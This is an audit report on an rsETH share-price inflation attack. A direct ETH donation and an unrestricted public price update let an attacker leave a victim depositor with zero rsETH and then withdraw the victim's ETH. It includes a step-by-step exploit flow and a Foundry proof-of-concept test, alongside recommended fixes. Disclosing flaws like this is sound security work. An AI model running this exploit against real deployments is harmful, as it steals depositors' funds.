Audit Report

## Title
rsETH Inflation Attack via ETH Donation Inflates `rsETHPrice`, Causing Victim Depositors to Receive Zero rsETH — (File: `contracts/LRTDepositPool.sol`, `contracts/LRTOracle.sol`)

## Summary
An unprivileged attacker can donate ETH directly to `LRTDepositPool` via its unrestricted `receive()` and call the public `updateRSETHPrice()` to arbitrarily inflate `rsETHPrice`. Because `getRsETHAmountToMint` uses plain integer division with no zero-output guard, a victim depositing with `minRSETHAmountExpected = 0` receives zero rsETH while their ETH is permanently locked. The attacker then redeems their seed rsETH position at the inflated price, recovering the donation plus the victim's deposit.

## Finding Description

**Root cause 1 — unrestricted ETH donation inflates `address(this).balance`**

`LRTDepositPool` accepts arbitrary ETH via an unrestricted fallback:

```solidity
// LRTDepositPool.sol L58
receive() external payable { }
```

`getETHDistributionData()` counts this balance directly as protocol TVL:

```solidity
// LRTDepositPool.sol L480
ethLyingInDepositPool = address(this).balance;
```

Any ETH sent directly to the contract is therefore included in `totalETHInProtocol` used by the oracle.

**Root cause 2 — `updateRSETHPrice()` is public with no price-increase guard when `pricePercentageLimit == 0`**

```solidity
// LRTOracle.sol L87-89
function updateRSETHPrice() public whenNotPaused {
    _updateRsETHPrice();
}
```

The guard only activates when `pricePercentageLimit > 0`:

```solidity
// LRTOracle.sol L256-257
bool isPriceIncreaseOffLimit =
    pricePercentageLimit > 0 && priceDifference > pricePercentageLimit.mulWad(highestRsethPrice);
```

`pricePercentageLimit` is never set in `initialize()` (LRTOracle.sol L64-68), so it defaults to `0`, leaving the price update completely unrestricted for any caller.

**Root cause 3 — minting formula uses floor division with no minimum-share guard**

```solidity
// LRTDepositPool.sol L520
rsethAmountToMint = (amount * lrtOracle.getAssetPrice(asset)) / lrtOracle.rsETHPrice();
```

If `rsETHPrice` is large enough, this floors to `0`. The only slippage check in `_beforeDeposit` is:

```solidity
// LRTDepositPool.sol L667-669
if (rsethAmountToMint < minRSETHAmountExpected) {
    revert MinimumAmountToReceiveNotMet();
}
```

When `minRSETHAmountExpected = 0`, the condition `0 < 0` is false — no revert. `_mintRsETH(0)` is called, the victim's ETH is accepted by the contract, and zero rsETH is minted.

**Exploit flow:**

1. Attacker calls `depositETH{value: 1}(0, "")` → receives 1 wei rsETH (`1 * 1e18 / 1e18 = 1`).
2. Attacker sends `D = 100 ether` directly to `LRTDepositPool` via `receive()`.
3. Attacker calls `lrtOracle.updateRSETHPrice()`:
   - `rsethSupply = 1`, `totalETHInProtocol ≈ 100e18 + 1`
   - `newRsETHPrice = (100e18 + 1) * 1e18 / 1 ≈ 100e36`
4. Victim calls `depositETH{value: 1 ether}(0, "")`:
   - `rsethAmountToMint = (1e18 * 1e18) / 100e36 = 0` (floors to zero)
   - Victim receives **0 rsETH**; 1 ETH is locked in the pool with no claim.
5. Attacker calls `lrtOracle.updateRSETHPrice()` again:
   - `rsethSupply = 1`, `totalETHInProtocol ≈ 101e18 + 1`
   - `newRsETHPrice ≈ 101e36`
6. Attacker calls `withdrawalManager.initiateWithdrawal(ETH_TOKEN, 1, "")`:
   - `getExpectedAssetAmount` (LRTWithdrawalManager.sol L168) uses the inflated `rsETHPrice`
   - `expectedAssetAmount = 1 * 101e36 / 1e18 ≈ 101 ether`
7. After the withdrawal delay, attacker calls `completeWithdrawal` and receives ≈101 ETH.
   - **Net profit ≈ 1 ETH** (victim's deposit); the 100 ETH donation is fully recovered.

The victim has no recovery path: all withdrawal functions (`initiateWithdrawal`, `instantWithdrawal`) require the caller to hold rsETH, which the victim does not.

## Impact Explanation

**Critical — Direct theft of user funds and permanent freezing of funds.**

The victim's deposited ETH is permanently locked (they hold 0 rsETH and cannot initiate any withdrawal). The attacker recovers the victim's ETH by redeeming their seed position at the inflated price. Both impact classes — permanent freezing and direct theft — are concretely demonstrated.

## Likelihood Explanation

- `pricePercentageLimit` is `0` by default (not set in `initialize()`), so the price-increase guard is inactive on any freshly deployed or not-yet-configured instance.
- `minAmountToDeposit` is also `0` by default, allowing the attacker's 1-wei seed deposit.
- `minRSETHAmountExpected = 0` is a common default in automated integrations, scripts, and UI front-ends.
- The attack is executable atomically within a single block (seed → donate → `updateRSETHPrice` → victim deposit → `updateRSETHPrice` → `initiateWithdrawal`).
- The attacker's capital (the donation `D`) is fully recovered after the attack completes.

**Likelihood: Medium** — conditional on `pricePercentageLimit == 0` (realistic for new deployments) and victim using zero slippage (realistic in practice).

## Recommendation

1. **Revert on zero rsETH minted**: In `_beforeDeposit` (LRTDepositPool.sol L665), add `if (rsethAmountToMint == 0) revert ZeroRsETHMinted();` immediately after computing `rsethAmountToMint`.
2. **Set `pricePercentageLimit` in `initialize()`**: A non-zero default (e.g., 1% = `1e16`) prevents a single call from inflating the price by an arbitrary factor.
3. **Restrict `receive()` or exclude untracked ETH**: Do not count raw `address(this).balance` as protocol TVL, or restrict ETH entry to named functions only (e.g., `receiveFromRewardReceiver`, `receiveFromNodeDelegator`).
4. **Virtual offset**: Add a virtual offset to both rsETH supply and ETH TVL in the price calculation to make large-scale manipulation economically infeasible.

## Proof of Concept

Preconditions: `pricePercentageLimit == 0`, `minAmountToDeposit == 0`, ETH is a supported asset, `rsETHPrice` initialized to `1e18`, `protocolFeeInBPS == 0`.

```solidity
// Foundry fork/unit test sketch
function testInflationAttack() public {
    // Step 1: Attacker seeds pool
    vm.prank(attacker);
    depositPool.depositETH{value: 1}(0, "");
    assertEq(rsETH.balanceOf(attacker), 1);

    // Step 2: Attacker donates ETH directly
    vm.prank(attacker);
    (bool ok,) = address(depositPool).call{value: 100 ether}("");
    assertTrue(ok);

    // Step 3: Attacker inflates price
    lrtOracle.updateRSETHPrice();
    assertGt(lrtOracle.rsETHPrice(), 1e18);

    // Step 4: Victim deposits with zero slippage
    vm.prank(victim);
    depositPool.depositETH{value: 1 ether}(0, "");
    assertEq(rsETH.balanceOf(victim), 0); // victim receives nothing

    // Step 5: Attacker updates price again
    lrtOracle.updateRSETHPrice();

    // Step 6: Attacker initiates withdrawal of ~101 ETH with 1 wei rsETH
    vm.prank(attacker);
    rsETH.approve(address(withdrawalManager), 1);
    withdrawalManager.initiateWithdrawal(LRTConstants.ETH_TOKEN, 1, "");

    // After delay: attacker completes withdrawal and recovers ~101 ETH
    vm.roll(block.number + withdrawalManager.withdrawalDelayBlocks() + 1);
    uint256 balBefore = attacker.balance;
    vm.prank(attacker);
    withdrawalManager.completeWithdrawal(LRTConstants.ETH_TOKEN, "");
    assertApproxEqAbs(attacker.balance - balBefore, 101 ether, 1e15);
}
